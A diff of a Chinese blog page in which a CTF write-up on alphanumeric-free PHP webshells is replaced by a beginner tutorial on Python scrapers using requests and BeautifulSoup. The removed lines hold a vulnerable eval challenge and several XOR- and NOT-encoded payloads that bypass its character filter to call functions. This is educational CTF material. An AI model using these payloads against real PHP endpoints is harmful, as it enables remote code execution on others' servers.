@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>不包含数字和字母的webshell · Ywc&#39;s blog</title>
+    <title>python爬虫 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">不包含数字和字母的webshell</a>
+                <a href="#" class="post-name">python爬虫</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            不包含数字和字母的webshell
+            python爬虫
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "python">python</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">400</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">2,850</span> / Reading time: <span class="post-count">11 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/11/08</span>
+                    <span class="post-intro-time">2019/02/18</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,33 +396,109 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这一串代码描述是这样子，我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数名，这里我们是 “getFlag”，然后动态执行之即可。</p>
-<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到getFlag函数，然后拿到webshell。</p>
-<p><strong>payload one</strong></p>
-<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag
-</code></pre><p>构造一个变量_ 变量的值为_GET 执行$<em>GET[</em>]($_GET[__])</p>
-<p><strong>payload two</strong> </p>
-<pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();
-</code></pre><p>把getFlag取反然后URL编码</p>
-<p><strong>payload three</strong></p>
-<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag
-</code></pre><p>~ 在 {} 中执行了取反操作，所以 ${~”\xa0\xb8\xba\xab”} 取反相当于 $_GET，拼接出了 $_GET<a href="">‘+’</a>;，传入 +=getFlag() 从而执行了函数</p>
-<p><strong>payload four</strong></p>
-<pre><code>?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();
-</code></pre><p>$啊=getFlag;$啊();，这里就不需要用 {} 了，因为取反的值直接被当作字符串赋值给了 $ 啊。</p>
-<p>当strlen($code)&gt;50时，还可以用</p>
-<pre><code>?code=${&quot;!&quot;^&quot;~&quot;}=&quot;]%];,&lt;&lt;&quot;^&quot;:@)}@][&quot;;${&quot;!&quot;^&quot;~&quot;}();
-</code></pre><p>参考文章：<a href="https://blog.csdn.net/weixin_42815001/article/details/81515427" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42815001/article/details/81515427</a></p>
-<p><a href="http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop" target="_blank" rel="noopener">http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop</a></p>
+        <ul>
+<li><a href="#%e7%88%ac%e8%99%ab%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5">爬虫的基本概念</a><ul>
+<li><a href="#%e4%bb%80%e4%b9%88%e6%98%af%e7%88%ac%e8%99%ab">什么是爬虫</a></li>
+<li><a href="#%e7%88%ac%e8%99%ab%e5%8f%af%e4%bb%a5%e5%81%9a%e4%bb%80%e4%b9%88">爬虫可以做什么</a></li>
+<li><a href="#%e7%88%ac%e8%99%ab%e7%9a%84%e6%9c%ac%e8%b4%a8%e6%98%af%e4%bb%80%e4%b9%88">爬虫的本质是什么</a></li>
+</ul>
+</li>
+<li><a href="#%e7%88%ac%e8%99%ab%e7%9a%84%e5%8e%9f%e7%90%86">爬虫的原理</a><ul>
+<li><a href="#%e7%88%ac%e8%99%ab%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%b5%81%e7%a8%8b">爬虫的基本流程</a></li>
+<li><a href="#%e4%bb%80%e4%b9%88%e6%98%afrequestresponse">什么是Request,Response</a><ul>
+<li><a href="#request%e4%b8%ad%e5%8c%85%e5%90%ab%e4%bb%80%e4%b9%88">Request中包含什么</a></li>
+<li><a href="#response%e4%b8%ad%e5%8c%85%e5%90%ab%e4%ba%86%e4%bb%80%e4%b9%88">Response中包含了什么</a></li>
+</ul>
+</li>
+<li><a href="#%e8%83%bd%e7%88%ac%e5%8f%96%e4%bb%80%e4%b9%88%e6%a0%b7%e7%9a%84%e6%95%b0%e6%8d%ae">能爬取什么样的数据</a></li>
+<li><a href="#%e5%a6%82%e4%bd%95%e8%a7%a3%e6%9e%90%e6%95%b0%e6%8d%ae">如何解析数据</a></li>
+<li><a href="#%e5%85%b3%e4%ba%8e%e6%8a%93%e5%8f%96%e7%9a%84%e9%a1%b5%e9%9d%a2%e6%95%b0%e6%8d%ae%e5%92%8c%e6%b5%8f%e8%a7%88%e5%99%a8%e9%87%8c%e7%9c%8b%e5%88%b0%e7%9a%84%e4%b8%8d%e4%b8%80%e6%a0%b7%e7%9a%84%e9%97%ae%e9%a2%98">关于抓取的页面数据和浏览器里看到的不一样的问题</a></li>
+<li><a href="#%e6%80%8e%e6%a0%b7%e4%bf%9d%e5%ad%98%e6%95%b0%e6%8d%ae">怎样保存数据</a></li>
+</ul>
+</li>
+<li><a href="#requests%e5%ba%93%e7%9a%84%e4%bd%bf%e7%94%a8">requests库的使用</a></li>
+<li><a href="#bs4%e5%ba%93%e7%9a%84%e5%ae%89%e8%a3%85%e4%b8%8e%e4%bd%bf%e7%94%a8">BS4库的安装与使用</a></li>
+<li><a href="#%e5%b8%b8%e7%94%a8%e7%9a%84%e7%88%ac%e8%99%ab%e5%9f%ba%e6%9c%ac%e6%a1%86%e6%9e%b6">常用的爬虫基本框架</a></li>
+<li><a href="#%e7%ae%80%e5%8d%95%e7%88%ac%e8%99%ab%e7%9a%84%e8%bf%90%e8%a1%8c%e6%b5%81%e7%a8%8b">简单爬虫的运行流程</a></li>
+</ul>
+<h2 id="爬虫的基本概念"><a href="#爬虫的基本概念" class="headerlink" title="爬虫的基本概念"></a>爬虫的基本概念</h2><h3 id="什么是爬虫"><a href="#什么是爬虫" class="headerlink" title="什么是爬虫"></a>什么是爬虫</h3><p>网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。</p>
+<p>其实通俗的讲就是通过程序去获取web页面上自己想要的数据，也就是 <strong>自动抓取数据</strong></p>
+<h3 id="爬虫可以做什么"><a href="#爬虫可以做什么" class="headerlink" title="爬虫可以做什么"></a>爬虫可以做什么</h3><p>你可以爬去妹子的图片，爬取自己想看看的视频…等等你想要爬取的数据，只要你能通过浏览器访问的数据都可以通过爬虫获取</p>
+<h3 id="爬虫的本质是什么"><a href="#爬虫的本质是什么" class="headerlink" title="爬虫的本质是什么"></a>爬虫的本质是什么</h3><p><strong>模拟浏览器打开网页，获取网页中我们想要的那部分数据</strong></p>
+<p>浏览器打开网页的过程：<br>当你在浏览器中输入地址后，经过DNS服务器找到服务器主机，向服务器发送一个请求，服务器经过解析后发送给用户浏览器结果，包括html,js,css等文件内容，浏览器解析出来最后呈现给用户在浏览器上看到的结果</p>
+<p>所以用户看到的浏览器的结果就是由HTML代码构成的，我们爬虫就是为了获取这些内容，通过分析和过滤html代码，从中获取我们想要资源（文本，图片，视频…..）</p>
+<h2 id="爬虫的原理"><a href="#爬虫的原理" class="headerlink" title="爬虫的原理"></a>爬虫的原理</h2><h3 id="爬虫的基本流程"><a href="#爬虫的基本流程" class="headerlink" title="爬虫的基本流程"></a>爬虫的基本流程</h3><p><strong>发起请求</strong><br>通过HTTP库向目标站点发起请求，也就是发送一个Request，请求可以包含额外的header等信息，等待服务器响应<br><strong>获取响应内容</strong><br>如果服务器能正常响应，会得到一个Response，Response的内容便是所要获取的页面内容，类型可能是HTML,Json字符串，二进制数据（图片或者视频）等类型<br><strong>解析内容</strong><br>得到的内容可能是HTML,可以用正则表达式，页面解析库进行解析，可能是Json,可以直接转换为Json对象解析，可能是二进制数据，可以做保存或者进一步的处理<br><strong>保存数据</strong><br>保存形式多样，可以存为文本，也可以保存到数据库，或者保存特定格式的文件</p>
+<h3 id="什么是Request-Response"><a href="#什么是Request-Response" class="headerlink" title="什么是Request,Response"></a>什么是Request,Response</h3><p>浏览器发送消息给网址所在的服务器，这个过程就叫做HTPP Request</p>
+<p>服务器收到浏览器发送的消息后，能够根据浏览器发送消息的内容，做相应的处理，然后把消息回传给浏览器，这个过程就是HTTP Response</p>
+<p>浏览器收到服务器的Response信息后，会对信息进行相应的处理，然后展示</p>
+<h4 id="Request中包含什么"><a href="#Request中包含什么" class="headerlink" title="Request中包含什么"></a>Request中包含什么</h4><p><strong>请求方式</strong><br>主要有：GET/POST两种类型常用，另外还有HEAD/PUT/DELETE/OPTIONS<br>GET和POST的区别就是：请求的数据GET是在url中，POST则是存放在头部</p>
+<p>GET:向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问</p>
+<p>POST:向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p>
+<p>HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p>
+<p>PUT：向指定资源位置上传其最新内容。</p>
+<p>OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p>
+<p>DELETE：请求服务器删除Request-URI所标识的资源。</p>
+<p><strong>请求URL</strong><br>URL，即统一资源定位符，也就是我们说的网址，统一资源定位符是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p>
+<p>URL的格式由三个部分组成：<br>第一部分是协议(或称为服务方式)。<br>第二部分是存有该资源的主机IP地址(有时也包括端口号)。<br>第三部分是主机资源的具体地址，如目录和文件名等。</p>
+<p>爬虫爬取数据时必须要有一个目标的URL才可以获取数据，因此，它是爬虫获取数据的基本依据。<br><strong>请求头</strong><br>包含请求时的头部信息，如User-Agent,Host,Cookies等信息，下图是请求请求百度时，所有的请求头部信息参数<br><strong>请求体</strong><br>请求体是携带的数据，如提交表单数据时候的表单数据（POST）</p>
+<h4 id="Response中包含了什么"><a href="#Response中包含了什么" class="headerlink" title="Response中包含了什么"></a>Response中包含了什么</h4><p>所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。</p>
+<p><strong>响应状态</strong><br>有多种响应状态，如：200代表成功，301跳转，404找不到页面，502服务器错误</p>
+<ul>
+<li>1xx消息——请求已被服务器接收，继续处理</li>
+<li>2xx成功——请求已成功被服务器接收、理解、并接受</li>
+<li>3xx重定向——需要后续操作才能完成这一请求</li>
+<li>4xx请求错误——请求含有词法错误或者无法被执行</li>
+<li>5xx服务器错误——服务器在处理某个正确请求时发生错误 </li>
+<li>常见代码：<ul>
+<li>200 OK 请求成功</li>
+<li>301 目标永久性转移</li>
+<li>302 目标暂时性转移</li>
+<li>400 Bad Request 客户端请求有语法错误，不能被服务器所理解</li>
+<li>401 Unauthorized 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</li>
+<li>403 Forbidden 服务器收到请求，但是拒绝提供服务 </li>
+<li>404 Not Found 请求资源不存在，eg：输入了错误的URL </li>
+<li>500 Internal Server Error 服务器发生不可预期的错误 </li>
+<li>503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li>
+</ul>
+</li>
+</ul>
+<p><strong>响应头</strong><br>如内容类型，类型的长度，服务器信息，设置Cookie，一般F12在浏览器中即可看到网页的响应头</p>
+<p><strong>响应体</strong><br>最主要的部分，包含请求资源的内容，如网页HTMl,图片，二进制数据等</p>
+<h3 id="能爬取什么样的数据"><a href="#能爬取什么样的数据" class="headerlink" title="能爬取什么样的数据"></a>能爬取什么样的数据</h3><p>网页文本：如HTML文档，Json格式化文本等<br>图片：获取到的是二进制文件，保存为图片格式<br>视频:同样是二进制文件<br>其他：只要请求到的，都可以获取</p>
+<h3 id="如何解析数据"><a href="#如何解析数据" class="headerlink" title="如何解析数据"></a>如何解析数据</h3><p>1.直接处理<br>2.Json解析<br>3.正则表达式<br>4.BeautifulSoup解析处理<br>5.PyQuery解析处理<br>6.XPath解析处理</p>
+<h3 id="关于抓取的页面数据和浏览器里看到的不一样的问题"><a href="#关于抓取的页面数据和浏览器里看到的不一样的问题" class="headerlink" title="关于抓取的页面数据和浏览器里看到的不一样的问题"></a>关于抓取的页面数据和浏览器里看到的不一样的问题</h3><p>出现这种情况是因为，很多网站中的数据都是通过js，ajax动态加载的，所以直接通过get请求获取的页面和浏览器显示的不同。</p>
+<p>如何解决js渲染的问题？</p>
+<p>分析ajax<br>Selenium/webdriver<br>Splash<br>PyV8,Ghost.py</p>
+<h3 id="怎样保存数据"><a href="#怎样保存数据" class="headerlink" title="怎样保存数据"></a>怎样保存数据</h3><p>文本：纯文本，Json,Xml等</p>
+<p>关系型数据库：如mysql,oracle,sql server等结构化数据库</p>
+<p>非关系型数据库：MongoDB,Redis等key-value形式存储</p>
+<h2 id="requests库的使用"><a href="#requests库的使用" class="headerlink" title="requests库的使用"></a>requests库的使用</h2><p><a href="https://zhuanlan.zhihu.com/p/26681429" target="_blank" rel="noopener">requests的安装与使用</a></p>
+<p>requests库本质上就是模拟了我们用浏览器打开一个网页，发起请求是的动作。它能够迅速的把请求的html源文件保存到本地</p>
+<p><strong>Requests库的7个主要方法：</strong></p>
+<p><img src="/2019/02/18/python爬虫/1.png" alt="python爬虫"></p>
+<p><strong>详细了解Response对象</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.get(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Response(self)</span></span><br><span class="line"><span class="string">The :class:Response &lt;Response&gt; object, which contains a server's response to an HTTP request.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP请求的返回状态，比如，200表示成功，404表示失败</span></span><br><span class="line"><span class="keyword">print</span> (r.status_code)</span><br><span class="line"><span class="comment"># HTTP请求中的headers</span></span><br><span class="line"><span class="keyword">print</span> (r.headers)</span><br><span class="line"><span class="comment"># 从header中猜测的响应的内容编码方式</span></span><br><span class="line"><span class="keyword">print</span> (r.encoding)</span><br><span class="line"><span class="comment"># 从内容中分析的编码方式（慢）</span></span><br><span class="line"><span class="keyword">print</span> (r.apparent_encoding)</span><br><span class="line"><span class="comment"># 响应内容的二进制形式</span></span><br><span class="line"><span class="keyword">print</span> (r.content)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">status_code:200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">headers:</span></span><br><span class="line"><span class="string">&#123;'Server': 'bfe/1.0.8.18', 'Date': 'Tue, 02 May 2017 12:01:47 GMT', 'Content-Type': 'text/html', 'Last-Modified': 'Mon, 23 Jan 2017 13:28:27 GMT', 'Transfer-Encoding': 'chunked', 'Connection': 'Keep-Alive', 'Cache-Control': 'private, no-cache, no-store, proxy-revalidate, no-transform', 'Pragma': 'no-cache', 'Set-Cookie': 'BDORZ=27315; max-age=86400; domain=.baidu.com; path=/', 'Content-Encoding':'gzip'&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">encoding: ISO-8859-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">apparent_encoding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<p><strong>requests抓取网页的通用框架:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtmlText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="comment"># 如果状态码不是200 则应发HTTOError异常</span></span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="comment"># 设置正确的编码方式</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Wrong!"</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    url=<span class="string">"http://www.baidu.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>
+<h2 id="BS4库的安装与使用"><a href="#BS4库的安装与使用" class="headerlink" title="BS4库的安装与使用"></a>BS4库的安装与使用</h2><p><a href="https://zhuanlan.zhihu.com/p/26683864" target="_blank" rel="noopener">BS4库的安装与使用</a></p>
+<p>bs4 全名 BeautifulSoup，是编写 python 爬虫常用库之一，主要用来解析 html 标签,把html源代码重新进行了格式化，从而方便我们对其中的节点、标签、属性等进行操作。</p>
+<p>初始化：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入bs4模块</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">soup=BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br></pre></td></tr></table></figure>
+<p>两个参数：第一个参数是要解析的html文本，第二个参数是使用那种解析器，对于HTML来讲就是html.parser，这个是bs4自带的解析器。如果一段HTML或XML文档格式不正确的话，那么在不同的解析器中返回的结果可能是不一样的。</p>
+<p><img src="/2019/02/18/python爬虫/2.png" alt="python爬虫"></p>
+<p>格式化输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup.prettify()   # prettify 有括号和没括号都可以</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.jianshu.com/p/2b783f7914c6" target="_blank" rel="noopener">BeautifulSoup模块使用指南</a></p>
+<h2 id="常用的爬虫基本框架"><a href="#常用的爬虫基本框架" class="headerlink" title="常用的爬虫基本框架"></a>常用的爬虫基本框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 首先我们写好抓取网页的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="comment">#这里我们知道百度贴吧的编码是utf-8，所以手动设置的。爬去其他的页面时建议使用：</span></span><br><span class="line">        <span class="comment"># r.endcodding = r.apparent_endconding</span></span><br><span class="line">        r.encoding=<span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">" ERROR "</span></span><br></pre></td></tr></table></figure>
+<h2 id="简单爬虫的运行流程"><a href="#简单爬虫的运行流程" class="headerlink" title="简单爬虫的运行流程"></a>简单爬虫的运行流程</h2><p><img src="/2019/02/18/python爬虫/4.png" alt="python爬虫"></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">November 8th 2018, 10:12:45 am</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/02/18/python爬虫/">https://yinwc.github.io/2019/02/18/python爬虫/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/02/18/python爬虫/">February 18th 2019, 3:04:23 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -431,16 +507,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/10/N1CTF2018题目复现/" title= N1CTF2018题目复现 >
-                    <div class="nextTitle">N1CTF2018题目复现</div>
+                <a href= "/2019/02/27/Ddos分布式拒绝服务攻击/" title= Ddos分布式拒绝服务攻击 >
+                    <div class="nextTitle">Ddos分布式拒绝服务攻击</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/11/08/python沙盒逃逸/" title= python沙箱逃逸 >
-                    <div class="prevTitle">python沙箱逃逸</div>
+                <a href= "/2019/02/15/python爬虫实战/" title= python爬虫实战 >
+                    <div class="prevTitle">python爬虫实战</div>
                 </a>
             
         </li>
@@ -552,7 +628,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#爬虫的基本概念"><span class="toc-number">1.</span> <span class="toc-text">爬虫的基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是爬虫"><span class="toc-number">1.1.</span> <span class="toc-text">什么是爬虫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爬虫可以做什么"><span class="toc-number">1.2.</span> <span class="toc-text">爬虫可以做什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爬虫的本质是什么"><span class="toc-number">1.3.</span> <span class="toc-text">爬虫的本质是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爬虫的原理"><span class="toc-number">2.</span> <span class="toc-text">爬虫的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爬虫的基本流程"><span class="toc-number">2.1.</span> <span class="toc-text">爬虫的基本流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是Request-Response"><span class="toc-number">2.2.</span> <span class="toc-text">什么是Request,Response</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Request中包含什么"><span class="toc-number">2.2.1.</span> <span class="toc-text">Request中包含什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Response中包含了什么"><span class="toc-number">2.2.2.</span> <span class="toc-text">Response中包含了什么</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#能爬取什么样的数据"><span class="toc-number">2.3.</span> <span class="toc-text">能爬取什么样的数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何解析数据"><span class="toc-number">2.4.</span> <span class="toc-text">如何解析数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于抓取的页面数据和浏览器里看到的不一样的问题"><span class="toc-number">2.5.</span> <span class="toc-text">关于抓取的页面数据和浏览器里看到的不一样的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#怎样保存数据"><span class="toc-number">2.6.</span> <span class="toc-text">怎样保存数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#requests库的使用"><span class="toc-number">3.</span> <span class="toc-text">requests库的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BS4库的安装与使用"><span class="toc-number">4.</span> <span class="toc-text">BS4库的安装与使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用的爬虫基本框架"><span class="toc-number">5.</span> <span class="toc-text">常用的爬虫基本框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单爬虫的运行流程"><span class="toc-number">6.</span> <span class="toc-text">简单爬虫的运行流程</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
